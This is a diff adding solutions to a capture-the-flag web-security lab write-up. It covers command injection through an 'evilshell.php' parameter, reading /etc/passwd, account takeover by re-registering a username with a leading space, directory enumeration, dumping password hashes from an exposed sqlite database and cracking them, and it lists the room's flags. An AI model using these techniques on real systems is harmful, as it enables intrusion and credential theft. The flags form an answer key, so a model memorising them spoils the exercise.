@@ -2,33 +2,53 @@
 
 ### What strange text file is in the website root directory?
 ```
+[in web]
+ls
+[in cmd]
+# curl -X GET http://10.10.235.224/evilshell.php?commandString=ls
+or
+# curl -X GET --data "commandString=ls" -G http://10.10.235.224/evilshell.php
 ```
-> *Answer:* 
+> *Answer:* drpepper.txt
 
 ### How many non-root/non-service/non-daemon users are there?
 ```
+cat /etc/passwd
 ```
-> *Answer:* 
+> *Answer:* 0
 
 ### What user is this app running as?
 ```
+whoami
 ```
-> *Answer:* 
+> *Answer:* www-data
 
 ### What is the user's shell set as?
 ```
+cat /etc/passwd
+...
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
 ```
-> *Answer:* 
+> *Answer:* /usr/sbin/nologin
 
 ### What version of Ubuntu is running?
 ```
+cat /etc/os-release
+or
+lsb_release -a
+or
+hostnamectl
 ```
-> *Answer:* 
+> *Answer:* 18.04.4
 
 ### Print out the MOTD.  What favorite beverage is shown?
 ```
+cat /etc/update-motd.d/00-header
+...
+DR PEPPER MAKES THE WORLD TASTE BETTER!
 ```
-> *Answer:* 
+> *Answer:* Dr Pepper
 
 
 <br><br>
@@ -36,13 +56,15 @@
 
 ### What is the flag that you found in darren's account?
 ```
+register a user " darren"
 ```
-> *Answer:* 
+> *Answer:* fe86079416a21a3c99937fea8874b667
 
 ### What is the flag that you found in arthur's account?
 ```
+register a user " arthur"
 ```
-> *Answer:* 
+> *Answer:* d9ac0f7db4fda460ac3edeb75d75e16e
 
 
 <br><br>
@@ -50,28 +72,43 @@
 
 ### What is the name of the mentioned directory?
 ```
+# dirsearch -u http://10.10.68.46/
+...
+[03:51:53] 301 -  311B  - /assets  ->  http://10.10.68.46/assets/
+[03:51:53] 200 -    2KB - /assets/
+...
 ```
-> *Answer:* 
+> *Answer:* /assets
 
 ### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
-```
-```
-> *Answer:* 
+> *Answer:* webapp.db
 
 ### Use the supporting material to access the sensitive data. What is the password hash of the admin user?
 ```
+# sqlite3 webapp.db
+SQLite version 3.36.0 2021-06-18 18:36:39
+Enter ".help" for usage hints.
+sqlite> .tables
+sessions  users   
+sqlite> PRAGMA table_info(users);
+0|userID|TEXT|1||1
+1|username|TEXT|1||0
+2|password|TEXT|1||0
+3|admin|INT|1||0
+sqlite> SELECT * FROM users;
+4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
+23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
+4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
+sqlite> .quit
 ```
-> *Answer:* 
+> *Answer:* 6eea9b7ef19179a06954edd0f6c05ceb
 
 ### What is the admin's plaintext password?
-```
-```
-> *Answer:* 
+Use <a href="https://crackstation.net/" target="_blank">Crackstation</a> or <a href="https://www.cmd5.org/" target="_blank">Cmd5</a>
+> *Answer:* qwertyuiop
 
 ### Login as the admin. What is the flag?
-```
-```
-> *Answer:* 
+> *Answer:* THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
 
 
 <br><br>
